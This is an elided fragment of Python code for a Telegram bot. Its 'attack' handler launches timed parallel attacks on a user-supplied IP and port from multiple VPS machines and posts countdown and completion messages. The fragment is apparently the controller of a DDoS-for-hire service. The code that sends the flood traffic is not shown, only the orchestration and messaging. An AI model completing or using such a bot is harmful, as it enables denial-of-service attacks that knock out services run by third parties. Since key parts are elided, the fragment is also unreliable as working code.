...
async def attack(update: Update, context: CallbackContext):
    ...
    message = await context.bot.send_message(chat_id, f"🔥 *Attack started on {target_ip}:{port} using {total_vps} VPS for {duration} seconds!*", parse_mode="Markdown")
    ...
    async def update_timer():
        ...
        while remaining_time > 0:
            try:
                await context.bot.edit_message_text(
                    ...
                    text=f"🔥 *Attack in progress on {target_ip}:{port} using {total_vps} VPS - {remaining_time} seconds remaining!*",
                    parse_mode="Markdown"
                )
        ...
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"🔥 *Attack on {target_ip}:{port} completed using {total_vps} VPS!*",
                parse_mode="Markdown"
            )
        except telegram.error.BadRequest:
            pass

    # ✅ Start attack and countdown simultaneously
    timer_task = asyncio.create_task(update_timer())
    attack_results = await asyncio.gather(*attack_tasks, return_exceptions=True)  # Runs attacks in parallel
    await timer_task  # Waits for countdown to finish
    ...
    # ✅ Send Final Completion Messages Immediately
    await context.bot.send_message(chat_id, f"✅ *Attack on {target_ip}:{port} has finished using {total_vps} VPS!*", parse_mode="Markdown")
